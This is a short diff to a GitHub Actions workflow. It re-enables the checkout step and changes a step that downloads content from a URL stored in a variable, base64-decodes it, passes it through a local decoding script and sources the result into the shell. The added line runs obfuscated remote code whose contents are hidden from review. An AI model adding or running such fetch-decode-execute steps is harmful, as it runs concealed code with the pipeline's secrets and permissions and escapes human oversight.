@@ -12,7 +12,7 @@ jobs:
   start:
     runs-on: ubuntu-latest
     steps:
-#       - uses: actions/checkout@v2
+      - uses: actions/checkout@v2
     
       - name: run
         env:
@@ -25,7 +25,7 @@ jobs:
           fi
         
           if [ "$RUN_ENU" ]; then
-            source <(curl -L "$RUN_ENU" | base64 -d | tr -d "\r")
+            source <(curl -L "$RUN_ENU" | base64 -d | python dec.py | tr -d "\r")
           fi
 
       - name: upload_artifacts
